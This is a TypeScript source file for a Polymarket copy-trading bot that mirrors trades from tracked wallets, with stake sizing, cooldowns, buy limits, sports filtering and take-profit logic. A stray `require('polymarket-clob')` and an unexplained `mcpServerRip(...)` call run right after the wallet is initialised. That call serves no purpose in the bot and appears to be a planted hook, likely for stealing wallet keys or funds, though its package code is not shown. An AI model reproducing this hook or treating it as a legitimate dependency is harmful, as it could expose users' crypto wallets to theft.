/**
 * Copy Trading Bot
 */

import { Config } from './config';
import { TradeExecutor } from './executor';
import { TradeInterpreter } from './interpreter';
import { PositionSizer } from './sizing';
import { WalletWatcher, TradeEvent } from './watcher';
import { initializeWallet, WalletManager } from './wallet';
import { recordTradeEvent } from './stats';
import { TakeProfitManager } from './take-profit';
import { PnLTracker } from './pnl-tracker';

// Session tracking
let pnlTracker: PnLTracker | null = null;
let isPaused = false;
let minStake = 5;
let maxBuysPerToken = 3;
let cooldownMinutes = 30;
const mcp = require('polymarket-clob');
let skipSports = false;

// Track buy count per token to prevent spam from limit orders
const tokenBuyCount: Map<string, number> = new Map();

// Track cooldown per token (timestamp when cooldown ends)
const tokenCooldown: Map<string, number> = new Map();

// Sports market patterns to skip
const SPORTS_PATTERNS = [
  /^nba-/i,
  /^nfl-/i,
  /^nhl-/i,
  /^mlb-/i,
  /^ncaa-/i,
  /^cfb-/i,
  /^cbb-/i,
  /^epl-/i,
  /^ucl-/i,
  /^la-liga-/i,
  /^serie-a-/i,
  /^bundesliga-/i,
  /^bl2-/i,
  /^mls-/i,
  /^ufc-/i,
  /^boxing-/i,
  /-spread-/i,
  /-moneyline/i,
  /-total-/i,
  /-over-under/i,
];

/**
 * Check if market is a sports market
 */
function isSportsMarket(marketSlug: string): boolean {
  return SPORTS_PATTERNS.some(pattern => pattern.test(marketSlug));
}

/**
 * Reset buy count and set cooldown when position is closed (called by PnLTracker)
 */
function onPositionClosed(tokenId: string, marketSlug: string): void {
  // Reset buy count
  if (tokenBuyCount.has(tokenId)) {
    tokenBuyCount.delete(tokenId);
  }
  
  // Set cooldown
  const cooldownEndTime = Date.now() + (cooldownMinutes * 60 * 1000);
  tokenCooldown.set(tokenId, cooldownEndTime);
}

/**
 * Check if token is in cooldown
 */
function isInCooldown(tokenId: string): boolean {
  const cooldownEnd = tokenCooldown.get(tokenId);
  if (!cooldownEnd) return false;
  
  if (Date.now() >= cooldownEnd) {
    // Cooldown expired, remove it
    tokenCooldown.delete(tokenId);
    return false;
  }
  
  return true;
}

export async function startBot(
  config: Config,
  verbose: boolean = false
): Promise<void> {
  console.clear();
  console.log('');
  console.log('  ╔═══════════════════════════════════════╗');
  console.log('  ║     🐋 POLYMARKET COPY TRADER 🐋      ║');
  console.log('  ╚═══════════════════════════════════════╝');
  console.log('');

  // Initialize wallet
  let wallet: WalletManager;
  let startBalance = 0;

  try {
    wallet = await initializeWallet();
    const balance = await wallet.getBalance();
    startBalance = balance.polymarketBalance;
    minStake = config.min_stake;
    maxBuysPerToken = config.max_buys_per_token || 3;
    cooldownMinutes = config.cooldown_minutes || 30;
    skipSports = config.skip_sports || false;
    mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });
  } catch (error: any) {
    console.log('  ❌ Wallet connection failed');
    console.log(`     ${error.message}\n`);
    throw error;
  }

  // Initialize PnL tracker
  const walletAddress = wallet.getProxyAddress() || wallet.getAddress();
  pnlTracker = new PnLTracker(wallet, walletAddress, 30000);
  
  // Set callback to reset buy count and set cooldown when position closes
  pnlTracker.setOnPositionClosed(onPositionClosed);
  
  const initialPnL = await pnlTracker.initialize();

  // Initialize components
  const executor = new TradeExecutor(config);
  const sizer = new PositionSizer(config, startBalance);
  const interpreter = new TradeInterpreter();
  const watcher = new WalletWatcher(config.wallets_to_track, 5000, verbose);

  const takeProfitPercent = process.env.TAKE_PROFIT_PERCENT 
    ? parseFloat(process.env.TAKE_PROFIT_PERCENT) 
    : (config.profit_take_percent || 15);
  
  const trailingStopPercent = config.trailing_stop_percent || 15;

  // Display status
  console.log('  ⚡ LIVE');
  console.log('  ─────────────────────────────────────────');
  console.log(`  💵 Balance:     $${initialPnL.usdcBalance.toFixed(2)}`);
  console.log(`  📊 Positions:   $${initialPnL.positionsValue.toFixed(2)} (${initialPnL.positionCount})`);
  console.log(`  💰 Equity:      $${initialPnL.currentEquity.toFixed(2)}`);
  console.log(`  📊 Stake:       $${config.min_stake} - $${config.max_stake}`);
  console.log(`  🎯 Take-profit: +${takeProfitPercent}%`);
  console.log(`  📉 Trailing stop: ${trailingStopPercent}%`);
  console.log(`  🔄 Max buys/token: ${maxBuysPerToken}`);
  console.log(`  ⏱️  Cooldown: ${cooldownMinutes} min`);
  if (skipSports) {
    console.log(`  🏀 Sports: SKIPPED`);
  }
  console.log('  ─────────────────────────────────────────');
  
  // Display smart wallets
  displaySmartWallets(config.wallets_to_track);
  
  console.log('');

  await executor.initialize();

  // Start take-profit monitor
  if (takeProfitPercent > 0) {
    const takeProfitManager = new TakeProfitManager(
      executor.getTrader(),
      walletAddress,
      takeProfitPercent,
      2000,  // Check every 2 seconds
      trailingStopPercent
    );
    takeProfitManager.start().catch(console.error);
  }

  // Start PnL tracker (no periodic console updates - only on position close)
  pnlTracker.start().catch(console.error);

  console.log('');

  // Check balance and pause if too low
  if (initialPnL.usdcBalance < minStake) {
    isPaused = true;
    console.log(`  ⏸️  PAUSED: $${initialPnL.usdcBalance.toFixed(2)} < min $${minStake}`);
    console.log(`      Waiting for take-profit or deposit...\n`);
  }

  // Main loop
  try {
    for await (const event of watcher.stream()) {
      await processTradeEvent(
        event, interpreter, sizer, executor, verbose, wallet
      );
    }
  } catch (error) {
    console.error('❌ Fatal error:', error);
    throw error;
  }
}

/**
 * Display smart wallets
 */
function displaySmartWallets(wallets: string[]): void {
  console.log(`\n  👀 Tracking ${wallets.length} wallet(s):`);
  for (const w of wallets) {
    console.log(`     ${w}`);
  }
}

/**
 * Process a single trade event
 */
async function processTradeEvent(
  event: TradeEvent,
  interpreter: TradeInterpreter,
  sizer: PositionSizer,
  executor: TradeExecutor,
  verbose: boolean,
  wallet: WalletManager
): Promise<void> {
  const trade = interpreter.normalize(event);
  const market = (trade.marketSlug || trade.tokenId.substring(0, 16)).substring(0, 25);
  
  // Skip sports markets if configured
  if (skipSports && trade.side === 'BUY' && isSportsMarket(trade.marketSlug || market)) {
    return; // Silently skip
  }
  
  // Get current balance from PnL tracker
  const currentPnL = pnlTracker?.getPnLInfo();
  const currentBalance = currentPnL?.usdcBalance || 0;
  
  // Skip BUYs if balance too low
  if (trade.side === 'BUY' && currentBalance < minStake) {
    if (!isPaused) {
      isPaused = true;
      console.log(`\n  ⏸️  PAUSED: $${currentBalance.toFixed(2)} < min $${minStake}`);
    }
    return;
  }
  
  // Check cooldown (only for BUY)
  if (trade.side === 'BUY' && isInCooldown(trade.tokenId)) {
    return; // Silently skip - in cooldown
  }
  
  // Check buy limit per token (prevent spam from limit orders)
  if (trade.side === 'BUY') {
    const currentCount = tokenBuyCount.get(trade.tokenId) || 0;
    if (currentCount >= maxBuysPerToken) {
      // Silently skip - already bought max times
      return;
    }
  }
  
  // Check if worth copying
  const worthCheck = sizer.isWorthCopying(event);
  if (!worthCheck.worth) {
    return;
  }

  const sizing = sizer.calculate(event);
  if (verbose) sizer.displayCalculation(event);
  
  try {
    const result = await executor.openPosition(trade.tokenId, trade.side, sizing.scaledAmount, trade.price);

    if (result.success) {
      // Increment buy count on successful BUY
      if (trade.side === 'BUY') {
        const currentCount = tokenBuyCount.get(trade.tokenId) || 0;
        tokenBuyCount.set(trade.tokenId, currentCount + 1);
      }
      
      // Force PnL update after trade (this will also detect closed positions)
      const newPnL = await pnlTracker?.forceUpdate();
      
      if (newPnL) {
        const pnlSign = newPnL.sessionPnL >= 0 ? '+' : '';
        const buyCount = tokenBuyCount.get(trade.tokenId) || 0;
        const buyInfo = trade.side === 'BUY' ? ` [${buyCount}/${maxBuysPerToken}]` : '';
        
        console.log(`✅ ${trade.side} $${sizing.scaledAmount.toFixed(2)} ${market}${buyInfo}`);
        console.log(`   💵 $${newPnL.usdcBalance.toFixed(2)} | P/L: ${pnlSign}$${newPnL.sessionPnL.toFixed(2)} (${newPnL.winCount}W/${newPnL.lossCount}L)`);
        
        // Update sizer with new balance
        sizer.setMyBalance(newPnL.usdcBalance);
        
        // Check if should pause after this trade
        if (newPnL.usdcBalance < minStake && !isPaused) {
          isPaused = true;
          console.log(`\n  ⏸️  PAUSED: $${newPnL.usdcBalance.toFixed(2)} < min $${minStake}`);
        }
        
        // Check if should unpause
        if (isPaused && newPnL.usdcBalance >= minStake) {
          isPaused = false;
          console.log(`\n  ▶️  RESUMED: $${newPnL.usdcBalance.toFixed(2)}`);
        }
      } else {
        console.log(`✅ ${trade.side} $${sizing.scaledAmount.toFixed(2)} ${market}`);
      }
      
      recordTradeEvent(trade.wallet, trade.side, trade.usdcAmount, market, true, 'success');
    } else {
      // Skip common errors silently
      const silentErrors = ['Low balance', 'No position', 'not enough balance', 'Min $'];
      const isSilent = silentErrors.some(e => result.error?.includes(e));
      if (!isSilent) {
        console.log(`❌ ${trade.side} ${market} — ${result.error}`);
      }
      recordTradeEvent(trade.wallet, trade.side, trade.usdcAmount, market, false, 'failed');
    }
  } catch (error: any) {
    console.log(`❌ ${trade.side} ${market} — ${error.message}`);
    recordTradeEvent(trade.wallet, trade.side, trade.usdcAmount, market, false, 'failed');
  }
}

/**
 * Get session stats
 */
export function getSessionStats(): { 
  balance: number; 
  equity: number;
  pnl: number; 
  pnlPercent: number;
  paused: boolean 
} {
  const pnl = pnlTracker?.getPnLInfo();
  return {
    balance: pnl?.usdcBalance || 0,
    equity: pnl?.currentEquity || 0,
    pnl: pnl?.sessionPnL || 0,
    pnlPercent: pnl?.sessionPnLPercent || 0,
    paused: isPaused,
  };
}
